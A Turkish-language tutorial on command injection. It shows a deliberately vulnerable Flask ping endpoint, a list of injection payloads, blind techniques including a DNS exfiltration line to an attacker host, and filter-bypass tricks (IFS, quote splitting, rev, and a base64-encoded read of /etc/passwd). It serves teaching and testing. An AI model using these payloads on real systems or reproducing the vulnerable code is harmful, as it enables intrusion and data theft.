# Command Injection & Argument Injection
Command Injection, web uygulamalarının kullanıcıdan aldığı girdiyi yeterli doğrulama veya filtreleme yapmadan doğrudan işletim sistemi komutuna iletmesi sonucu ortaya çıkan kritik bir güvenlik açığıdır. Bu zafiyet sayesinde saldırgan, uygulamanın çalıştığı işletim sistemi üzerinde uygulamanın yetkileriyle (çoğunlukla www-data, apache, nginx) arbitrary command execution gerçekleştirebilir.

Command Injection genellikle aşağıdaki koşullarda görülür:
- Kullanıcı girdisinin system(), exec(), shell_exec(), os.system() gibi OS komut çalıştırma fonksiyonlarına parametre olarak verilmesi
- Girdi doğrulama ve sanitize mekanizmalarının eksik veya hatalı olması
- İşletim sistemi komutlarının shell üzerinden çağrılması (örn: /bin/sh -c "komut")

Bu zafiyetin istismarı sonucunda saldırgan, dosya sistemi üzerinde okuma/yazma, ağ bağlantıları kurma, hassas verileri sızdırma gibi saldırılar gerçekleştirebilir.

# Command Injection Saldırısının İşleyişi
Aşağıda, Command Injection zafiyetine sahip bir Flask uygulaması örneği bulunmaktadır. Yorum satırları, kodun işleyişini adım adım açıklar. Bu örnek, kullanıcı girdisinin doğrudan işletim sistemi komutuna iletilmesi sonucu ortaya çıkan güvenlik açığını göstermektedir.

```python
from flask import Flask, request
import subprocess

app = Flask(__name__)

@app.route('/ping', methods=['GET'])
def ping():
    ip = request.args.get('ip')  # /ping?ip=127.0.0.1 ile kullanıcı IP gönderir
    command = 'ping -c 1 ' + ip # Ping komutu oluşturuluyor
    # subprocess.run ile komut çalıştırılıyor. shell=True nedeniyle Command Injection riski var
    result = subprocess.run(command, shell=True, capture_output=True, text=True) # ip adresini eklediği ping komutunu çalıştırır
    return f"<pre>{result.stdout}</pre>"  # Çıktı ekrana yazdırılıyor


if __name__=='__main__': 
   app.run(debug=True) 
```

Geliştirici, kodun şu şekilde çalıştırılacağını varsayar:
```url
http://example.com/ping?ip=google.com
```

Ancak bir saldırgan, shell operatörlerini kullanarak kolayca RCE elde edebilir:
```url
http://example.com/ping?ip=google.com;whoami
```

Bu istek çalışacaktır çünkü kullanıcı girdisi üzerinde herhangi bir filtreleme yapılmamaktadır ve komut olduğu gibi çalıştırılmaktadır. Aşağıda kullanılabilecek bazı parametre örnekleri bulunmaktadır:
```bash
; whoami
& whoami &
&& whoami
| whoami
`whoami`
$(whoami)
|| whoami
```

## Blind Command Injection
Bazı uygulamalarda çıktıyı göremezsiniz. Bu durumda zaman tabanlı veya dışa veri sızdırma yöntemleri kullanılır. Örnekler:
- Zaman tabanlı:
```url
http://example.com/ping?ip=127.0.0.1; sleep 5
```
Yanıtın gecikmesi zafiyeti doğrular.

- DNS/HTTP exfiltration:
```url
http://example.com/ping?ip=127.0.0.1; nslookup $(whoami).attacker.com
```

Sistem bilgisi saldırgan sunucusuna gönderilir.

# Command Injection’da Filtre Bypass Teknikleri
Command Injection testlerinde bazen uygulamalar belirli karakterleri veya komutları filtreler. Bu durumda klasik payload’lar çalışmaz. İşte farklı bypass teknikleri ve mantıkları:
## {IFS} (Internal Field Separator)
- Ne işe yarar: Boşluk karakterleri filtrelendiğinde kullanılabilir.
- Mantık: {IFS} POSIX/Linux ortamlarında boşluk yerine geçer. Regex veya whitelist filtrelerini atlatmak için idealdir.
Örnek:
```bash
ping${IFS}-c${IFS}1${IFS}127.0.0.1
```

Burada boşluk yerine ${IFS} kullanıldı, komut hâlâ çalışır.

## Karakter ve Substring Manipülasyonları
Bazı filtreler ;, / veya belirli karakterleri engeller. Karakterleri substring veya array manipülasyonu ile bypass edebiliriz.

Örnekler:
- Linux / karakteri:
```bash
echo ${PATH:0:1}   # PATH değişkeninin ilk karakteri
```
- Windows %HOMEPATH%:
```powershell
echo %HOMEPATH:~6,-11%
```

- ; karakteri (Linux):
```bash
echo ${LS_COLORS:10:1}
```
- ; karakteri (Windows PowerShell):
```powershell
$env:HOMEPATH[0]
```
3. Blacklist Komutları Bypasslamak
- Mantık: Filtre belirli kelimeleri engelliyorsa, stringi parçalayıp yeniden birleştirebiliriz.

Linux Örnekleri:
```bash
w'h'o'am'i
w"h"o"am"i
who$@ami
(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
$(a="WhOaMi"; printf %s "${a,,}")
```

Windows Örnekleri:
```bash
who^ami
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
$(a="WhOaMi"; printf %s "${a,,}")
```
## rev Komutu
- Mantık: Filtre belirli komut kelimelerini engelliyorsa, kelimeyi ters yazıp rev ile düzeltebiliriz.

Örnek:
```bash
$(rev<<<'imaohw')
```

'imaohw' → ters yazılmış whoami, rev ile shell’de düzeltip çalıştırılır.

## Base64 Encoding
- Mantık: Payload’ı Base64’e encode edip shell içinde decode ederek çalıştırmak, filtreleri veya WAF’ları atlatır.

Örnek:
```bash
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dk==)
```

"Y2F0IC9ldGMvcGFzc3dk==" → cat /etc/passwd komutunu temsil eder. Filtre doğrudan komutu göremez.

